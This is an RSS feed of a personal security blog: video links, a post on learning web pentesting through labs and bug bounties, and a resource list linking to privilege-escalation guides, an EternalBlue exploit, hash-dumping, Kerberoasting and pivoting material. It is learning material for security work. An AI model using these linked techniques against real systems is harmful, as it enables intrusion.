<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>
			Posts on Pruthvi's Ground Report
		</title>
		<link>
			https://pruthvirajbhat.github.io/posts/
		</link>
		<description>
			Recent content in Posts on Pruthvi's Ground Report
		</description>
		<generator>
			Hugo -- gohugo.io
		</generator>
		<lastBuildDate>
			Sun, 07 Mar 2021 02:30:30 +0000
		</lastBuildDate>
		<link href="https://pruthvirajbhat.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
		<item>
			<title>
				My Videos
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2021/03/my-videos/
			</link>
			<pubDate>
				Sun, 07 Mar 2021 02:30:30 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2021/03/my-videos/
			</guid>
			<description>
				My Videos A compilation of videos from Presentations/Live Streamings given by me.
				Simulation of OSCP with Hack The Box and VulnHub machines Apr 11, 2020
				Live streaming I did of a simulation of the OSCP Exam with HTB Machines + a Vulnhub machine (BOF), this is video is complemented with my post A Journey in the Dark - An adventure&amp;rsquo;s tale towards OSCP
				HTB NL Meetup 03 - And we start our journey Jun 17, 2020
			</description>
			<content type="html">
				<![CDATA[
				<h1 id="my-videos">My Videos</h1>
				<p>A compilation of videos from Presentations/Live Streamings given by me.</p>
				<h2 id="simulation-of-oscp-with-hack-the-box-and-vulnhub-machines">Simulation of OSCP with Hack The Box and VulnHub machines</h2>
				<p>Apr 11, 2020</p>
				<p>Live streaming I did of a simulation of the OSCP Exam with HTB Machines + a Vulnhub machine (BOF), this is video is complemented with my post <a href="https://pruthvirajbhat.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">A Journey in the Dark - An adventure&rsquo;s tale towards OSCP</a></p>
				
				<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
				<iframe src="https://www.youtube.com/embed/FwZc6JigIcE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
				</div>
				
				<h2 id="htb-nl-meetup-03---and-we-start-our-journey">HTB NL Meetup 03 - And we start our journey</h2>
				<p>Jun 17, 2020</p>
				<p>Presentation I gave at the <a href="https://hackdewereld.nl/posts/0x03-we-start-our-journey/">Dutch Hack The Box meetup</a> after passing my OSCP. Talking a bit about my background, and what I do consider is some of the knowledge pre-needed, and how to approach the studying of the exam, etc.</p>
				
				<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
				<iframe src="https://www.youtube.com/embed/u9ENKjDNQBA" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
				</div>
				
				<p>The code of the presentation can be found here:</p>
				<pre><code class="language-console" data-lang="console">https://github.com/ceso/presentations/tree/master/meetup_nl_20200617_starting
				</code></pre><h2 id="learning-aws-security-with-flawscloud">Learning AWS Security with flaws.cloud</h2>
				<p>Mar 7, 2021</p>
				<p>Live streaming I gave at twitch going through the challenges at flaws.cloud as a way to learn a little bit about security on AWS.</p>
				
				<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
				<iframe src="https://www.youtube.com/embed/8wy0WqfRIjc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
				</div>
				]]>
			</content>
		</item>
		<item>
			<title>
				Q3liZXJzZWMgbXkgd2F 5IC0gUGFydCAxCg==
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2021/02/q3lizxjzzwmgbxkgd2f-5ic0gugfydcaxcg/
			</link>
			<pubDate>
				Sun, 14 Feb 2021 16:00:00 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2021/02/q3lizxjzzwmgbxkgd2f-5ic0gugfydcaxcg/
			</guid>
			<description>
				Preface Lot of things have happend since the last time I posted something here, such as moving back to my country at the middle of last year to also stopping studying for some months due prioritizing my mental health (2020 was a bitch to all of us).
				I already talked a bit about my background and how I started to study Cybersec in my prior post related to my experience with OSCP, you can go there and read about it if you want, but I will repeat some stuff here.
			</description>
			<content type="html">
				<![CDATA[
				<h2 id="preface">Preface</h2>
				<p>Lot of things have happend since the last time I posted something here, such as moving back to my country at the middle of last year to also stopping studying for some months due prioritizing my mental health (2020 was a bitch to all of us).</p>
				<p><em><strong>I already talked a bit about my background and how I started to study Cybersec in my prior post related to <a href="https://pruthvirajbhat.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">my experience with OSCP</a>, you can go there and read about it if you want, but I will repeat some stuff here.</strong></em></p>
				<p>Well! This post will be an insight about how I&rsquo;m learning Cybersec, at the moment, tools I use, channels Im watching, how I&rsquo;m practicing, etc, said all of this&hellip;let&rsquo;s jump in!</p>
				<h3 id="0x000-define-goals-what-do-i-want-to-do">0x000: Define goals, What do I want to do?</h3>
				<p>This is the first thing I do, define goals. Specifically talking in this case, Cybersec is a HUGEE world of things to learn (as almost anything in IT), and it has a lot of different domains of knowledge, so&hellip;is needed to have clear in mind what one want&rsquo;s to do and from here start climbing up the mountain.
				For example, what do you want to know the most?</p>
				<p>Web Pentesting?</p>
				<p>Reversing?</p>
				<p>Mobile Pentesting?</p>
				<p>Malware development?</p>
				<p>Physycall Assesments?</p>
				<p>Network Pentesting?</p>
				<p>Pentest embebed devices (such as IoT)?</p>
				<p>In my case, after some months of thinking, <strong>I made my mind and defined my goals: I want to learn WebApp Pentesting and Mobile/IoT pentesting. And end up doing Red Team stuff</strong> Of course this is not a static thing, one is always changing, and what I want to do today, could not be the same I want to do in 1 week, but the onlye way you will realize about it, is putting your hands on the fire!!</p>
				
				<img src="/images/blog/cybersecmyway/goals.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h3 id="0x001-what-do-i-need-to-do-to-achieve-my-goals-define-your-way-to-learning">0x001: What do I need to do to achieve my goals? Define your way to learning</h3>
				<p>In Cybersec as any other domain knowledge of IT, everything has pre-requisites (or dependencies), things you should know or have an idea about it, if is the opposite when you are trying to learn something without that knowledge, you will a huge wall or either find an oportunity to learn that knowledge you are lacking.</p>
				<p>Let&rsquo;s make clear what I&rsquo;m talking about with a short example:</p>
				<pre><code class="language-console" data-lang="console">I wanna learn:
				- A
				- B
				- C
				- X
				
				'A' has as a pre-requisite knowing (or having an idea) about:
				
				- Z
				- D
				- J
				
				Now...to understand 'J' you first need to know about:
				
				- C
				- B
				
				But in order to being able to understand what is all the noise
				regardless 'C' and 'B', you need to know about:
				
				- D
				- X
				</code></pre><p>Or in a graphical way:</p>
				
				<img src="/images/blog/cybersecmyway/knowledge_domain.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>And here my dear reader, is where things tart to get 100% personal&hellip;why you may ask? Because you need to find what works best for you, what works for you might not work for me, as might work for other person and for another not.</p>
				<p>Some people could prefer to NOT jump into learning about A, B, C, X until they know all that is needed from the basics, let&rsquo;s say they will start learning D and X, after they know about it they will continue with C and B, from that point they will continue with J and Z, now thay they got the basics, finally they will learn about A. It is a valid way to learn (and is the most extended one: highschool, university, etc. Every curricula is made up following the graph of dependencies), and it has a huge benefit you will have a really solid foundation, but in my personal case, that way of learning&hellip;it doesn&rsquo;t work for me.</p>
				<p>Then&hellip;how do I approach learning (and cybersec which has a ton shit of dependencies)? In a really &ldquo;exploratory way&rdquo;, if I go in the more dependencie graph way&hellip;I end up bored, unmotivated, etc. I personally feel it as forcing myself to do something I do not want.
				I do not give to much attention to foundations/basics, <em><strong>I just define what I want to learn and get my hands dirty with the subject</strong></em>, I wanna learn &lsquo;A&rsquo;? Well nice I start reading/playing with labs related to &lsquo;A&rsquo;, if I reach a point where I no longer understand anything due to not knowing about the basic foundations it has, then well, I &ldquo;open a branch&rdquo; in my learning process, go to that branch and start learning about the basics I do need, if to understand those basics I do need to &ldquo;open another branch&rdquo; related to another subject, then I just do it, and at a given point of time, I have the needed knowledge to understand what I was trying to learn of &lsquo;A&rsquo;, at that moment I just &ldquo;go back&rdquo;, to the root from the firsts &ldquo;branchs&rdquo; just opened and continue from it, if at a given moment there is needed again to learn a foundation, ok sure, I just repeat that process.
				Tied to this &ldquo;exploratory&rdquo; way in which I approach learning, I&rsquo;m also really practical, then I will learn mostly by doing things, getting my hands dirty, not just by reading.</p>
				<p><strong>As I said, this is 100% and it&rsquo;s the way I learn, it might not be the most efficient, you might not have the most solid foundations, but it&rsquo;s the one that has been working the most for me, the one that feels the more natural and the one that keeps me the most motivated (I started the travel wanting to know about &lsquo;A&rsquo;, but I ended up knowing about more than A!!!).</strong></p>
				<p><em>By the way, this is the way I learned (and still doing it) english, it all started by creating a &ldquo;basic&rdquo; vocabulary by translating a bunch of words from Spanish to English. From there trying to read stuff in english if a wild new word appeared in front of me (let&rsquo;s say &lsquo;reassess), I jumped to google and typed &lsquo;reassess meaning&rsquo; and tried to understand the definition of the word directly in english, if the definition used words I still didn&rsquo;t know, then opened tabs and searched for &lsquo;<!-- raw HTML omitted --> meaning&rsquo;, and repeat the process of trying to understand the definitions of every word, once I understood all the words/vocabulary I needed, at that moment I went back to the root of everything (googling the meaning of &lsquo;reassess&rsquo;) and with the new gathered vocabulary tried to understand what &lsquo;reassess&rsquo; was, if I didn&rsquo;t I will repeat the process refreshing everything, and if I did: SUCCESS!! I understood what &lsquo;reassess&rsquo; mean, but not only that, in the process I learned a ton of another words!</em></p>
				<p><em>Note: if you see something that needs to be fixed (I wrote it really bad), feel free to let me know or open a PR :D</em></p>
				<p>Now that I talked about how I approach my learning, how this is transfered to Cybersec?? If you managed to read until this point, kudos to you! Let&rsquo;s take a look at it!</p>
				
				<img src="/images/blog/cybersecmyway/learn.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="0x010-starting-into-cybersec">0x010: Starting into Cybersec</h2>
				<p>My journey into IT started back in 2014 as a Jr. Linux Sysadmin, since then I have been climbing up some seniorities/companies in such position and also starting to move more to a DevOps role. I always have been quite attracted to the idea of breaking things (more being as a child I learned about the world and played with toys by breaking), but never got the spirit to study about it, late at 2019 I discovered Hack The Box, and since then I keep falling in love with Cybersec even more.</p>
				<p>So, I started playing in HTB for some months, after that I went after OSCP and saved it at my first try <!-- raw HTML omitted --> (struggled a lot during the exam, you can read more about it in my post, the link is in the preface). The sad news is that OSCP is just the tip of the iceberg, there is more and more things around to smash your head against it (best this way, you will always have something to keep you entertained), then now&hellip;what???</p>
				<p>Well, as i said about the goals, I know I want to get better a WebApp pentesting, for this I&rsquo;m doing the following things:</p>
				<ul>
				<li>Playing with <a href="https://portswigger.net/web-security">Web Security Academy</a> by Portswigger (same people that maintains Burp Suite, let me know if you want some post about Burp).</li>
				<li>Reading disclosed bug bounty reports in Hacker1.</li>
				<li>Sometimes following content of <a href="https://github.com/bugcrowd/bugcrowd_university">Bugcrowd University</a>.</li>
				<li>Watching some well-known hackers in the community such as <a href="https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg">STÖK</a>, <a href="https://www.youtube.com/user/RootOfTheNull">John Hammond</a>, <a href="https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw">The Cyber Mentor</a>, among others.</li>
				<li>Once in a while I read some chapter of <a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470">The Web Application Hacker&rsquo;s Handbook 2nd Ed</a>.</li>
				<li>I read and sometimes look up back at some chapters/links to reports in the book <a href="https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616">Real-World Bug Hunting</a>.</li>
				<li>I read blog articles from bug hunters, such as this serie about <a href="https://blog.usejournal.com/bug-hunting-methodology-part-1-91295b2d2066">Bug Hunting Methodology</a>. You can find more <a href="https://pruthvirajbhat.github.io/posts/2020/12/hacking-resources/">Hacking resources as this one in this post of mine</a></li>
				<li>I was playing with HTB until I moved back to my country, but I do not have a way to pay the subscription at the moment (also I don&rsquo;t like the latency of the free account), once I have a way to get the VIP account back, I will start playing with it (and so the write-ups will come again!). On top of this, I think I will start playing with the <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a>, and the <a href="https://github.com/OWASP/NodeGoat">OWASP NodeGoat</a> (If start playing with any of those, I will start to do live streamings of me playing with them :D).
				Another Lab I want to play with (and also will do live streams) is <a href="https://github.com/madhuakula/kubernetes-goat">Kubernetes-Goat by madhuakula</a> which is an intentionally vulnerable Kubernets cluster (and this one, goes quite hand-in-hand with my possible duties at my current workplace. More than I might go after <a href="https://www.cncf.io/certification/cka/">CKA</a> as it is something I was advised to do at work, and also a pre-requisite to take the <a href="https://www.cncf.io/certification/cks/">CKS</a>).</li>
				<li>And last, I play around with Bug Bountie Programs in <a href="https://hackerone.com/">Hacker1</a> and <a href="https://www.intigriti.com/">Intigriti</a>. So far I haven&rsquo;t found anything, but what matters for me at the moment is not to get money, is to enjoy the process of learning, if I keep looking at programs (basically learning new techniques and applying them, sharping my eyes, my methdology, etc) the day I report a bounty will come alone, to have fun is the most important part :D.</li>
				</ul>
				<h3 id="web-security-academy">Web Security Academy</h3>
				<p>Currently, most of the time I spend it playing with Web Security Academy. <strong>I Highly recommend jumping straight into this, the labs are pretty good, the explantions are clear, and the content is always up-to date!</strong>
				They way I&rsquo;m using it is a bit a combination of their <a href="https://portswigger.net/web-security/learning-path">Learning Path</a> and the way I approach learning that I explained before&hellip;this is: I look at the learning path and read the description of things, if something catch&rsquo;s my interest I open that subject and start reading and playing with their labs straight away.</p>
				<p>Plenty of times I have needed to take a look at the solution of the labs and follow the steps along, but I do not consider it as cheating or whatever&hellip;from my point of view there isn&rsquo;t such thing as &ldquo;cheating&rdquo; when it comes to learning. What really matters is to end up with new knowledge, if the way to adquire it implies sometimes to read the &ldquo;solution/how-to&rdquo;, then I do not see a problem, lot of times I don&rsquo;t even know where/how to start, or I know how to start but end up without knowing how to proceed from a certain point, and a pick at the solution or following the entire step-by step, ends up teaching me in the process a lot, so I will say do not neglect looking at it, or do not think you &ldquo;failed&rdquo; if you needed to help yourself with it, if there wasn&rsquo;t a point to look at solutions once in a while, there wouldn&rsquo;t be given solutions.</p>
				<p>At the time of writing this blog post, my progress on Web Security Academy goes as follows:</p>
				
				<img src="/images/blog/cybersecmyway/progresswebacademy.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>As I mentioned before, I&rsquo;m going through the stuff that takes my attention the most. For example I haven&rsquo;t done anything related to Path Traversal, but I know something about them thanks to HTB and OSCP, while I don&rsquo;t know nothing about Web Cache Poisioning, so I find more interesting to keep as priority what I don&rsquo;t know and takes my attention than what I already have some ideas but that doesn&rsquo;t take my attention.
				Today (2021/02/14) for example, I was playing around with Insecure Deserialization, and I must say at first I was looking at it as something really dark and blablabla, but it&rsquo;s actually quite nice!!
				Did you know insecure deserialization can be exploited using memory corruption? Or that you can inject arbitrary objects, even if are not valid and end up causing damage? Well even you could exploit deserialization by using &ldquo;gadget chains&rdquo; (basically gadgets are snippets of code that already exist inside the application. The use of individual gadgets with a user input can&rsquo;t do anything harmful, but by combinating multiple gadgets, AKA gadget-chains, it could allow an attacker to end up passing the input into a dangerous sink gadget where it could cause a lot of damage!!). All of this thanks to the insecure process of deserialization, which will deserialize things without verifying what is in, it could be through an error at the end, but it will be to late because stuff will be already executed.
				Well I didn&rsquo;t know any of that some hours back, but I know about path traversal (just to continue the example), and I just got quite excited by learning it and playing around with the labs related to insecure deserialization&hellip;SO GO GO GO and start getting your hands really dirty!!</p>
				<h3 id="learning-web-development">Learning Web Development</h3>
				<p>As I have mentioned back, I&rsquo;m not a Developer I come from a Sysadmin background (and I&rsquo;m still one) I do not know nothing about web development, but I think is a really valuable tool to have in my belt, if I know something about it. To know a bit how does it feel to be one, what kind of complications one can found while working on a web, which ones are the workarounds needed to put in place thanks to business requirments, what kind of pressures due to deadlines they go through and with it what errores are more prone to do (basically understanding the web development also from a business perspective not only technical)
				And on top of this, is quite nice to being able to do code review and pick up vulnerabilities with a glance at the code.</p>
				<p>Following this reasoning I got interested and motivated into learning a bit of Web Development. I&rsquo;m not talking about being one, or getting a deep knowledge, just the tip of the iceberg&hellip;If you can think and feel like the enemy, then you have extra cards under your sleeve!!
				Well&hellip;not to mention I also really want to take <a href="https://www.offensive-security.com/awae-oswe/">OSWE</a> in the future, so this motivates me even more.
				By following such reasoning, I ended up in this post at reddit of some people talking about <a href="https://www.reddit.com/r/learnprogramming/comments/cmm21n/shoutout_to_the_odin_project_sysadmin_to_full/">the odin project, from sysadmin to webdev</a>.</p>
				<p>After reading a bit about it, I decided to start going through it, and to be honest I feel more comfortable than with other courses I tried. <a href="https://www.theodinproject.com/">The Odin Project</a> is basically a curricula that walks you through differents tutorial/courses of external pages, and in the end of every lesson you end up with projects to do&hellip;so, not just learning/watching, but most important: hands-on!</p>
				<p>The Odin Project has 3 pahts: Foundations (Basic projects with javascript and HTML/CSS), Ruby on Rails, and Javascript. In my case i started with the Full Stack Javascript, but hit a wall and started to go through some lessons of the Foundations (as I say at the beggining, the way of learning that works for me xD).</p>
				
				<img src="/images/blog/cybersecmyway/odinproject.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="0x011-the-road-ahead">0x011: The road ahead</h2>
				
				<img src="/images/blog/cybersecmyway/journey.jpg"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>I covered most than anything how and what I&rsquo;m learning at the moment, but&hellip;what about the future?
				As I said in the beggining I want to become better at WebApp pentest and described my way to approach it and what resources I&rsquo;m relying on.
				Once I end up with Web Security Academy, I will keep looking for bounties, and in parallel as I get better at code, I will start doing some CVE Hunting to improve my white pentest skills, you can watch a nice presentation about CVE Hunting given by <a href="https://cyber-dragon.nl/">V1s3r10n</a> at the Dutch HTB Meetup 0x04 in <a href="https://youtu.be/GdV8a19AqUQ">this video</a>.</p>
				<p>And as I said above, I wanna take OSWE in the future, so that&rsquo;s another thing I&rsquo;m thinking to do once I end up with Web Security Academy and looking for some bounties (if I get to tackle down some bounties, better, money to pay OSWE! haha). In the same lines I&rsquo;m pretty excited about <a href="https://www.offensive-security.com/pen300-osep/">OSEP</a>, because it covers avoiding detection and bypassing defense techniques (for example play around with Active Directories, Antivirus, etc), and all of that is quite interesting, is basically to learn more about Red Team techniques (thing that is wayyy to interesting, fun and excited. And is something I also would like to know more). There is another course/cert by Offsec I wanna do in some future, <a href="https://www.offensive-security.com/exp301-osed/">OSED</a> which covers exploit development on Windows, and getting to know techniques, learn new methodologies about it. Those 3 goe hand-in-hand with my goals, which is covering a wide surface of knowledge on WebApp pentest, and red team stuff.</p>
				<p>Now, when it comes to Mobile/IoT pentest, my way to learn about it will be to start learning/playing with the <a href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes">UnCrackable Mobile Apps by OWASP</a> as they are used as examples throughout the <a href="https://owasp.org/www-project-mobile-security/">OWASP mobile security guide</a> and with the <a href="https://github.com/oversecured/ovaa">Oversecured Vulnerable Android App</a>, good thing is that a lot of the Mobile pentest is basically to apply stuff from the ending journey of WebApp pentest.
				Also I will put effort into learn something which is taking my attention the most in some way: Hardware. For this <em>my idea</em> is to start playing around with ARM and some analogic electronic/PLC&rsquo;s (which I have been having in my TODO for a couple of years now).
				Once is published, I&rsquo;m thinking on getting <a href="https://www.bookdepository.com/Hardware-Hacking-Handbook-Jasper-van-van-Woudenberg/9781593278748">The Hardware Hacking Handbook</a> and go through it.</p>
				<p>Besides all of it&hellip;I do not have that much things in mind on how to approach Mobile/IoT pentest but is not something that has my mind that busy at the moment, I already have a long road ahead just with the things I explained through this post, and is what has all of my attention now, I will not worry about how to cross a bridge that I still didn&rsquo;t reach, not to mention that my mind could change in a couple of weeks/months/years related on how to approach Mobile/IoT, but hey!! Once I start the journey with them I will write a similar post to this one but related to those, let&rsquo;s say part 2, 3, 5?? I don&rsquo;t know it will depend in what thing I&rsquo;m fighting at that moment, there&rsquo;s no need to think about it now (And doesn&rsquo;t help my anxiety).</p>
				<h2 id="0x100-conclusion">0x100: Conclusion</h2>
				<p>I more or less talked about my way to learn stuff, and how I&rsquo;m approaching Cybersec at the moment as how I&rsquo;m thinking to approach it in the future (as well, domains of knowledge I&rsquo;m interested on).
				Due my daily work isn&rsquo;t anything related to Pentest/Offensive Attacks (again, I&rsquo;m working as a Sysadmin/DevOps), the labs I mentioned and Bug Bounties (production environments) are my way at this moment to get some hands-on experience, and I will keep with them but with the aim to moving to a Cybersec position in the future.</p>
				<p>All of that said, thanks if you read until this point, I will be doing a live stream talking about this as well and will update the post with the link, cya!!!</p>
				]]>
			</content>
		</item>
		<item>
			<title>
				Hacking Resources
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2020/12/hacking-resources/
			</link>
			<pubDate>
				Fri, 04 Dec 2020 00:00:00 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2020/12/hacking-resources/
			</guid>
			<description>
				Hacking Resources This isn&amp;rsquo;t more than another hacking resources list. I basically throw here every resource I get interested on taking a look/playing with it, or stuff that I use as a reference while trying to break something.
				Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ &amp;lt;&amp;mdash;&amp;mdash; For Firefox https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp &amp;lt;&amp;mdash;&amp;mdash; For Chrome https://cookie-editor.cgagnier.ca/#download https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/ Cool Tools/Labs https://hackthebox.eu/ https://www.vulnhub.com/ https://www.blacklanternsecurity.com/2020-12-02-WriteHat/ https://github.com/madhuakula/kubernetes-goat https://github.com/m8r0wn/ActiveReign https://github.com/sundowndev/PhoneInfoga https://github.com/GoSecure/dtd-finder https://www.shodan.io/ https://crt.sh/ https://censys.io/ https://dnsdumpster.com/ https://mxtoolbox.com/ https://github.
			</description>
			<content type="html">
				<![CDATA[
				<h1 id="hacking-resources">Hacking Resources</h1>
				<p>This isn&rsquo;t more than another hacking resources list. I basically throw here every resource I get interested on taking a look/playing with it, or stuff that I use as a reference while trying to break something.</p>
				<h4 id="usefull-web-browser-plugins">Usefull Web Browser plugins</h4>
				<ul>
				<li><a href="https://www.wappalyzer.com/download/">https://www.wappalyzer.com/download/</a></li>
				<li><a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/</a> <strong>&lt;&mdash;&mdash; For Firefox</strong></li>
				<li><a href="https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp">https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp</a> <strong>&lt;&mdash;&mdash; For Chrome</strong></li>
				<li><a href="https://cookie-editor.cgagnier.ca/#download">https://cookie-editor.cgagnier.ca/#download</a></li>
				<li><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/</a></li>
				</ul>
				<h4 id="cool-toolslabs">Cool Tools/Labs</h4>
				<ul>
				<li><a href="https://hackthebox.eu/">https://hackthebox.eu/</a></li>
				<li><a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></li>
				<li><a href="https://www.blacklanternsecurity.com/2020-12-02-WriteHat/">https://www.blacklanternsecurity.com/2020-12-02-WriteHat/</a></li>
				<li><a href="https://github.com/madhuakula/kubernetes-goat">https://github.com/madhuakula/kubernetes-goat</a></li>
				<li><a href="https://github.com/m8r0wn/ActiveReign">https://github.com/m8r0wn/ActiveReign</a></li>
				<li><a href="https://github.com/sundowndev/PhoneInfoga">https://github.com/sundowndev/PhoneInfoga</a></li>
				<li><a href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder</a></li>
				<li><a href="https://www.shodan.io/">https://www.shodan.io/</a></li>
				<li><a href="https://crt.sh/">https://crt.sh/</a></li>
				<li><a href="https://censys.io/">https://censys.io/</a></li>
				<li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
				<li><a href="https://mxtoolbox.com/">https://mxtoolbox.com/</a></li>
				<li><a href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes">https://github.com/OWASP/owasp-mstg/tree/master/Crackmes</a></li>
				<li><a href="https://github.com/oversecured/ovaa">https://github.com/oversecured/ovaa</a></li>
				<li><a href="https://github.com/OWASP/NodeGoat">https://github.com/OWASP/NodeGoat</a></li>
				<li><a href="https://owasp.org/www-project-juice-shop/">https://owasp.org/www-project-juice-shop/</a></li>
				<li><a href="https://portswigger.net/web-security">https://portswigger.net/web-security</a></li>
				</ul>
				<h4 id="linux-privilege-escalation">Linux Privilege Escalation</h4>
				<ul>
				<li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
				<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation</a></li>
				<li><a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a></li>
				<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
				<li><a href="https://www.win.tue.nl/~aeb/linux/hh/hh-8.html">https://www.win.tue.nl/~aeb/linux/hh/hh-8.html</a></li>
				<li><a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm</a></li>
				</ul>
				<h4 id="windows-privilege-escalation">Windows Privilege Escalation</h4>
				<ul>
				<li><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li>
				<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
				<li><a href="https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md">https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md</a></li>
				<li><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a> <strong>&lt;&mdash;&mdash; Eternal blue without MSF</strong></li>
				<li><a href="https://github.com/ankh2054/windows-pentest">https://github.com/ankh2054/windows-pentest</a></li>
				<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
				<li><a href="https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html">https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html</a></li>
				<li><a href="https://github.com/frizb/Windows-Privilege-Escalation">https://github.com/frizb/Windows-Privilege-Escalation</a></li>
				</ul>
				<h4 id="windows-stuff">Windows stuff</h4>
				<ul>
				<li><a href="http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf">http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf</a></li>
				<li><a href="https://www.lemoda.net/windows/windows2unix/windows2unix.html">https://www.lemoda.net/windows/windows2unix/windows2unix.html</a></li>
				<li><a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html</a></li>
				<li><a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/">https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/</a></li>
				<li><a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html</a></li>
				<li><a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/</a></li>
				</ul>
				<h4 id="powershell">Powershell</h4>
				<ul>
				<li><a href="https://vipulvyas0813.medium.com/introduction-to-powershell-for-penetration-testing-733236bc9547">https://vipulvyas0813.medium.com/introduction-to-powershell-for-penetration-testing-733236bc9547</a> <strong>&lt;&mdash;&mdash; Serie about Poershell for Penetration Testing (5 posts)</strong></li>
				</ul>
				<h4 id="exploit-developmentreversing">Exploit Development/Reversing</h4>
				<ul>
				<li><a href="https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html">https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html</a></li>
				<li><a href="https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/">https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/</a></li>
				<li><a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing</a></li>
				</ul>
				<h4 id="linux-stuff">Linux stuff</h4>
				<ul>
				<li><a href="http://www.pathname.com/fhs/pub/fhs-2.3.html">http://www.pathname.com/fhs/pub/fhs-2.3.html</a></li>
				<li><a href="http://www.linusakesson.net/programming/tty/">http://www.linusakesson.net/programming/tty/</a></li>
				<li><a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">http://pentestmonkey.net/blog/post-exploitation-without-a-tty</a></li>
				</ul>
				<h4 id="pivoting">Pivoting</h4>
				<ul>
				<li><a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a></li>
				<li><a href="https://nullsweep.com/pivot-cheatsheet-for-pentesters/">https://nullsweep.com/pivot-cheatsheet-for-pentesters/</a></li>
				<li><a href="https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html">https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html</a></li>
				</ul>
				<h4 id="brute-forcecracking">Brute force/Cracking</h4>
				<ul>
